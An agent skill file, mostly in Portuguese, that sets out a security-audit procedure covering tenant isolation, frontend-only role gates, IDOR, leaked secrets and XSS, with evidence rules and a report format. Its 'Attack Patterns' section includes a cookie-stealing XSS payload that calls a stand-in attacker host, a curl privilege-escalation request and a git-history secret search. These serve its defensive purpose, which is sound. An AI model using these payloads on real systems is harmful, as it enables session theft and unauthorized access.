---
name: security-audit
description: Stack-adaptive codebase security audit. Detects the project's language, framework, ORM, auth mechanism, frontend and deploy files first, then sweeps five verified failure classes (missing tenant/owner isolation, browser-side privilege gates, IDOR, hardcoded secrets, unhandled input/XSS) and produces evidence-backed findings, a strengths section, prioritized recommendations and a ready report with GitHub issues.
license: MIT
metadata:
    aes-category: security
    aes-priority: high
---

# Security Audit

## Objective

Ensinar o agente a executar uma auditoria de segurança **adaptativa à stack**: detectar
primeiro qual é a stack do projeto (linguagem, framework, ORM/query builder, mecanismo
de auth, frontend, arquivos de deploy), mapear cinco classes canônicas de falha para os
equivalentes reais dessa stack e percorrer o código **sistematicamente, arquivo por
arquivo, handler por handler**, reportando apenas achados verificados com evidência
`arquivo:linha`.

As cinco classes (stack-independentes em intenção, dependentes em tradução):

```text
1. BANCO SEM TRAVA      — isolamento de tenant/dono ausente ou furado
2. PERMISSÃO NO NAVIGADOR — gate de papel só no frontend, sem checagem server-side
3. IDOR                 — objeto referenciado por ID sem verificação de posse
4. CHAVES EXPOSTAS      — segredos hardcoded, defaults públicos, histórico git
5. INPUTS SEM TRATAMENTO — XSS / injeção de HTML por input não sanitizado
```

## When to Use

* Pedido explícito de auditoria de segurança de um repositório, código ou serviço.
* Antes de lançar/deployar um sistema que lida com dados de múltiplos usuários ou tenants.
* Quando a tarefa menciona "security audit", "find vulnerabilities", "penetration",
  "hardcoded secrets", "IDOR", "XSS", "tenant isolation", "audit this codebase".
* **Não** para uma única classe isolada: use a skill especializada (`authorization-audit`
  para authz/IDOR em profundidade, `input-trust-audit` para confiança de input,
  `api-abuse-audit` para endpoints como superfície diretamente acessível,
  `data-integrity-audit` para constraints no banco).
* **Composição:** esta skill é o **guarda-chuva** que produz o relatório final; as
  especializadas aprofundam cada categoria. Pareia com `adversarial-review` (testar
  bypass/repetição dos achados) e `error-flow-audit` (meios de caminho: o que acontece
  quando a checagem falha no meio).

## Mental Model

A auditoria é um pipeline de **tradução → varredura → verificação → consolidação**:

```text
DETECT STACK  →  MAP CATEGORIES  →  SWEEP SYSTEMATICALLY  →  VERIFY  →  REPORT
 (o que é?)      (classe →           (todos os handlers,       (evidência,   (achados +
                   equivalente          TODOS, não               não          pontos fortes +
                   real da stack)       amostras)                hipótese)    issues)
```

Três princípios governam o modelo:

1. **A classe é o invariant; a stack é a tradução.** "Toda query de leitura filtra pelo
   tenant?" é o invariant. Em Supabase vira "RLS habilitada em toda tabela?"; em API
   própria vira "todo SELECT de listagem/relatório/exportação tem WHERE org_id =
   session.org?"; em ORM com middleware vira "o scope default está aplicado?". Identificar
   **qual é o mecanismo de isolamento do projeto** antes de procurar ausência dele.

2. **O frontend é sugestão, não fonte de verdade.** Todo gate de UI (`isAdmin`,
   `canEdit`, role-based rendering) é um *indicador* de que existe uma operação
   privilegiada — e portanto um *endereço* para cruzar com o endpoint correspondente.
   A pergunta nunca é "a UI esconde?", é "o servidor rejeita?".

3. **Cobertura é mensurável.** Uma auditoria sem lista do que foi verificado e está
   correto não distingue "não achei" de "não procurei". A seção de pontos fortes é
   prova de cobertura, não gentileza.

Segredos seguem uma regra própria: **default público que não falha no startup é segredo
vazado por design** (`${VAR:-changeme}` em produção sem validação de startup).

## Investigation Procedure

1. **Detectar a stack.** Ler `package.json` / `go.mod` / `requirements.txt` /
   `Gemfile` / `pom.xml`; identificar framework web, ORM/query builder, mecanismo de
   auth (session, JWT, Supabase/Auth0/Clerk), frontend (React/Vue/Svelte/template
   engine), e arquivos de deploy (Dockerfile, docker-compose, Helm, Terraform, CI).
   Registrar a detecção — ela vai para a nota metodológica do relatório.

2. **Mapear as cinco categorias para a stack.** Para cada classe, escrever o equivalente
   concreto. Exemplo: projeto sem frontend → categoria 5 vira N/A explícito (backend só
   renderiza HTML em e-mails? então o alvo é o template de e-mail). **Nunca forçar
   achado em categoria inaplicável; declarar N/A com justificativa.**

3. **Categoria 1 — isolamento.** Localizar o mecanismo de isolamento (RLS policies,
   middleware de tenant, filtro manual por `user_id`/`org_id`). Listar TODAS as tabelas/
   collections/índices e cruzar com onde o filtro existe. Foco especial em queries de
   agregação, relatório, busca e exportação — as que mais esquecem o filtro.

4. **Categoria 2 — gate no navegador.** Grep dos gates de papel no frontend
   (`isAdmin`, `role ===`, `can(`, `hasPermission`). Para cada gate, localizar o endpoint
   que a UI chama e abrir o handler: o servidor valida o privilégio? Cruzar um por um.

5. **Categoria 3 — IDOR.** Enumerar TODOS os handlers de rota do backend (roteador por
   roteador, não amostra). Para cada um que aceita ID (path, query ou body) de objeto
   pertencente, verificar checagem de posse/tenant. Registrar handler por handler na
   planilha de cobertura.

6. **Categoria 4 — segredos.** Varredura em quatro camadas: (a) código/config/scripts/
   docs por chaves, tokens, senhas, segredos de assinatura, credenciais padrão; (b)
   deploy files (docker-compose, Helm values, CI env) por defaults `${VAR:-publico}` e
   ausência de validação de startup que rejeite o default; (c) histórico git
   (`git log --all -p` com padrões de segredo) por segredos commitados e removidos
   depois — continuam válidos se não rotacionados; (d) bundle do frontend por chaves
   embutidas (uma chave publicada é pública por definição — classificar pelo tipo, não
   pelo medo).

7. **Categoria 5 — input não tratado.** No frontend: sinks de HTML
   (`innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`), render de
   markdown/HTML sem sanitização, URLs controladas por usuário em `href`/`src`
   (`javascript:`), `eval`/`new Function`. Verificar se existe lib de sanitização no
   projeto e se ela é aplicada **em cada ponto encontrado**. No backend: input do usuário
   entrando em HTML de e-mail, templates ou respostas sem escape.

8. **Verificar cada candidato.** Para cada achado: reproduzir (PoC local, request, teste)
   ou apontar o mecanismo exato com `arquivo:linha` + trecho. Classificar confiança pela
   escala do AGENTS.md § 2. Registrar **condições de explorabilidade** (feature flag,
   config insegura, scope global) — um bug que exige config insegura é achado com
   condição, não achado cancelado.

9. **Consolidar pontos fortes.** Para cada rota/tabela/gate verificado sem defeito,
   registrar a evidência da proteção ("router X valida posse em todos os N handlers").

10. **Reportar.** Findings via `templates/audit-report.md`, agrupados por categoria,
    ordenados por severidade; recomendações priorizadas P1/P2/P3; e — quando o pedido
    incluir relatório — gerar o documento final (tabela de achados, gráfico por
    severidade, seção de issues prontas para o tracker).

## Questions to Ask

* Qual é o mecanismo de isolamento DESTE projeto? Onde cada query de leitura o aplica?
* Este handler de listagem/relatório/exporta filtrou pelo tenant ou só "parece" filtrar?
* Para cada gate de papel no frontend: qual endpoint ele chama? O endpoint rejeita sem a UI?
* Este ID no path/query/body pertence a alguém? O handler sabe?
* Este `${VAR:-default}` é segredo real se o deploy esquecer a env? O startup valida?
* O que está no histórico git que foi "removido" mas nunca rotacionado?
* Este markdown/HTML vindo do usuário passou por sanitização — ou só por um lib instalado?
* A categoria faz sentido para esta stack, ou estou forçando achado? (N/A explícito)
* Se eu souber apenas o ID de um recurso alheio, o que consigo ler/editar/deletar?
* O que esta auditoria provou que está correto? (cobertura)

## Attack Patterns

```text
agregação sem filtro — categoria 1
    GET /api/stats/total-orders          → conta pedidos de TODOS os tenants
    (o handler de listagem filtra org_id; o de agregação esqueceu)

exportação esquecida — categoria 1
    GET /api/reports/export.csv          → sem WHERE tenant → dump completo

gate decorativo — categoria 2
    frontend: {isAdmin && <AdminPanel/>}
    curl -X POST /api/admin/users -b cookie_de_usuario_comum   → 200

IDOR por verb alternativo — categoria 3
    GET /api/documents/123   (checa posse)
    GET /api/documents/123/preview   (esqueceu)          → lê alheio
    DELETE bloqueado; PATCH {archived:true} liberado     → destrói alheio

default que vira segredo — categoria 4
    docker-compose: JWT_SECRET=${JWT_SECRET:-dev-secret}
    deploy sem env → token forjável com segredo público do repo
    (sem startup check que recuse o default = vulnerável por design)

segredo fantasma — categoria 4
    git log --all -p | grep AWS_SECRET   → removido no commit 7,
    chave nunca rotacionada → ainda válida no bundle publicado

markdown não sanitizado — categoria 5
    comentário: <img src=x onerror="fetch(attacker/?c="+document.cookie)">
    render via v-html / dangerouslySetInnerHTML sem DOMPurify → XSS stored

href controlado — categoria 5
    perfil.link = "javascript:alert(1)"  → <a href={{link}}> sem scheme allowlist
```

## Evidence Requirements

* Todo achado: `arquivo:linha` + trecho do código real + por que é explorável +
  severidade (crítica/alta/média/baixa/informativa) + condições de explorabilidade.
* **Nada de especulação reportada como bug.** Escala do AGENTS.md § 2:
  * `CONFIRMED` — reproduzido (PoC, request, teste) com resultado observado.
  * `HIGH CONFIDENCE` — mecanismo exato + evidência estrutural localizada, sem reprodução.
  * `POSSIBLE` — mecanismo ou evidência incompletos; investigar mais antes de reportar.
  * `SPECULATIVE` — listar apenas como risco a verificar; nunca bloquear release com isto.
* IDOR/authz: o padrão-ouro é dois atores — A acessa recurso de B e o servidor aceita.
* Segredos: provar que o valor é usado (não exemplo de doc) e, se histórico git, o
  commit exato + se foi rotacionado.
* Cobertura: a planilha handler-por-handler (categoria 3) e tabela-por-tabela
  (categoria 1) é evidência de varredura completa; sem ela, declarar escopo parcial.

## False Positives

* **Recurso público por design** — perfil público, post público: ausência de filtro de
  dono é intenção, não defeito. Confirmar a intenção antes.
* **Middleware/global cobre a rota** — o handler "sem checagem" pode estar protegido por
  middleware no prefixo. Verificar que o middleware aplica à rota exata (verb incluído).
* **Chave de publishable é pública** — `pk_live_…`, client IDs de OAuth, project ref do
  Firebase: projetadas para o bundle. Reportar só se a permissão delas no servidor é
  ampla demais (config mal feita), não pela exposição em si.
* **Exemplo em doc/fixture** — `API_KEY=xxx` em README de exemplo não é segredo. Provar
  uso real antes.
* **Framework auto-escapa** — React `{value}`, Angular `{{ }}`, templates Jinja2 com
  autoescape: não é XSS. O sink é apenas onde o escape foi contornado
  (`dangerouslySetInnerHTML`, `|safe`, `v-html`).
* **Sanitização no write, não no read** — pode ser estratégia válida (escape na entrada
  centralizado). Verificar a estratégia, não exigir o padrão favorito.
* **Categoria inaplicável à stack** — projeto sem frontend não tem "permissão no
  navegador"; CLI sem banco não tem RLS. Declarar N/A é resultado correto, não lacuna.
* **Segredo em env de CI referenciado por `secrets.*`** — referência não é valor.

## Output Format

Para cada achado, um finding via `templates/audit-report.md` com os campos obrigatórios
(`affected_component`, `invariant`, `mechanism`, `state_transition`, `impact`,
`severity`, `confidence`, `evidence[]` com `source` = `arquivo:linha`), agrupados pelas
cinco categorias. Ordem de apresentação: crítica → baixa, IDOR e isolamento primeiro.

O relatório final deve conter:

```text
capa + nota metodológica (stack detectada → tradução das categorias)
resumo executivo (contagem por severidade; por categoria)
pontos fortes (o que foi verificado e está protegido, com evidência)
tabela de achados (Severidade | Arquivo:linha | Descrição)
recomendações priorizadas (P1, P2, P3…)
issues para o tracker — texto completo por achado acionável
  (título, labels, evidência, impacto, correção sugerida, critérios de aceite),
  agrupando achados triviais do mesmo tema em issue única para não gerar spam
```

Findings consolidados passam por `scripts/findings.py` quando múltiplas skills
contribuíram (dedup + recálculo de confiança pela evidência agregada).
